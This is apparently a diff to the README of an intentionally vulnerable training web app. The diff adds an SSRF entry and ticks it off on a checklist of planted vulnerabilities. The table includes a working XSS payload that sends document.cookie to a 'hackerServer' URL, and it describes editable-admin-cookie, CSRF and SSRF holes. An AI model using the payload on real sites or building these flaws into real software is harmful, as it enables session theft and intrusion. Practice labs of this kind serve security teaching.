@@ -39,6 +39,7 @@ If you want to test SQli you need to create **postgresql** database with that cr
 | XSS | \<svg onload='var i = new Image(); i.src="http://localhost:3001/acceptCookie?cookie="+btoa(document.cookie);'> | PostInfo field | Allow to send user cookie to **hackerServer** website |
 | Broken Access Control | Any logged in user can edit **isAdmin** cookie parameter | DevTools Application Cookie | Get access to admin page |
 | CSRF | Run hacker server | Send hacker server url to logged in user | Allow hacker make a post on the website if user click the link |
+| SSRF | Change hidden input value to **hackerServer** | Show products input | Allow make requests from website server |
 
 ---
 
@@ -48,4 +49,4 @@ If you want to test SQli you need to create **postgresql** database with that cr
 *   [x] XSS vuln.
 *   [x] Broken Access Control vuln.
 *   [x] CSRF vuln.
-*   [ ] SSRF vuln.
+*   [x] SSRF vuln.
